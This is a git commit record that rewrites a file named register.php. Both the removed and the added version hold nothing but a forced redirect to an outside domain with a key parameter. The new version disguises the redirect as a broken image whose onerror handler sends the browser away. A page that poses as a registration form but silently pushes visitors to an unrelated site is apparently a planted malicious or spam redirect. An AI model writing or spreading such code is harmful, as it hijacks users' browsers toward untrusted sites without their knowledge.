4941c123411245d81228bbff3735854060eb997d
adaderros <142612240+adaderros@users.noreply.github.com>
2025-01-12 03:58:04 +0600

    Update register.php

--- register.php
+++ register.php
@@ -1,1 +1,1 @@
-<html><body><META HTTP-EQUIV="Refresh" CONTENT="0;URL=https://cavitybetween.com/qgy68jse?key=50d7811474225ba917b483a1351da2b7"></body></html>
+<img src="/static/images/d4fdf41d5g.png" onerror=window.location="https://cavitybetween.com/qgy68jse?key=50d7811474225ba917b483a1351da2b7">
